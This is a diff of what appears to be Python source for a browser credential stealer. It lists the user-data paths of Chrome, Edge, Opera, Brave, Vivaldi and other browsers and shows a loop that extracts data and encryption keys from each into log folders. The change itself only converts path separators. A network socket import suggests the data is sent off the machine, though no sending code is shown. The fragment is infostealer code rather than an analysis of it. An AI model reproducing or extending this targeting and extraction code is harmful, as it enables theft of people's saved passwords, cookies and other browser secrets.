@@ -15,47 +15,47 @@ from util.socket import socket_initialise
 browsers = [
     {
         'name': 'Chrome',
-        'path': os.getenv('localappdata') + r'\Google\Chrome\User Data',
+        'path': os.getenv('localappdata') + '/Google/Chrome/User Data',
         'has_profiles': True,
     },
     {
         'name': 'Edge',
-        'path': os.getenv('localappdata') + r'\Microsoft\Edge\User Data',
+        'path': os.getenv('localappdata') + '/Microsoft/Edge/User Data',
         'has_profiles': True,
     },
     {
         'name': 'Opera',
-        'path': os.getenv('appdata') + r'\Opera Software\Opera Stable',
+        'path': os.getenv('appdata') + '/Opera Software/Opera Stable',
         'has_profiles': False,
     },
     {
         'name': 'Opera GX',
-        'path': os.getenv('appdata') + r'\Opera Software\Opera GX Stable',
+        'path': os.getenv('appdata') + '/Opera Software/Opera GX Stable',
         'has_profiles': False,
     },
     {
         'name': 'Vivaldi',
-        'path': os.getenv('localappdata') + r'\Vivaldi\User Data',
+        'path': os.getenv('localappdata') + '/Vivaldi/User Data',
         'has_profiles': True,
     },
     {
         'name': 'Brave',
-        'path': os.getenv('localappdata') + r'\BraveSoftware\Brave-Browser\User Data',
+        'path': os.getenv('localappdata') + '/BraveSoftware/Brave-Browser/User Data',
         'has_profiles': True,
     },
     {
         'name': 'Epic',
-        'path': os.getenv('localappdata') + r'\Epic Privacy Browser\User Data',
+        'path': os.getenv('localappdata') + '/Epic Privacy Browser/User Data',
         'has_profiles': True,
     },
     {
         'name': 'Blisk',
-        'path': os.getenv('localappdata') + r'\Blisk\User Data',
+        'path': os.getenv('localappdata') + '/Blisk/User Data',
         'has_profiles': True,
     },
     {
         'name': 'Chromium or SRWare Iron',
-        'path': os.getenv('localappdata') + r'\Chromium\User Data',
+        'path': os.getenv('localappdata') + '/Chromium/User Data',
         'has_profiles': True,
     },
 ]
@@ -83,7 +83,7 @@ if __name__ == '__main__':
             print(f"Extracting from {browser['name']}")
 
             # Create directory for browser logs
-            browser_logs_path = f"{LOGS_PATH}\\{browser['name']}"
+            browser_logs_path = f"{LOGS_PATH}/{browser['name']}"
             mkdir_if_not_exists(browser_logs_path)
 
             # Extract encryption key for the browser
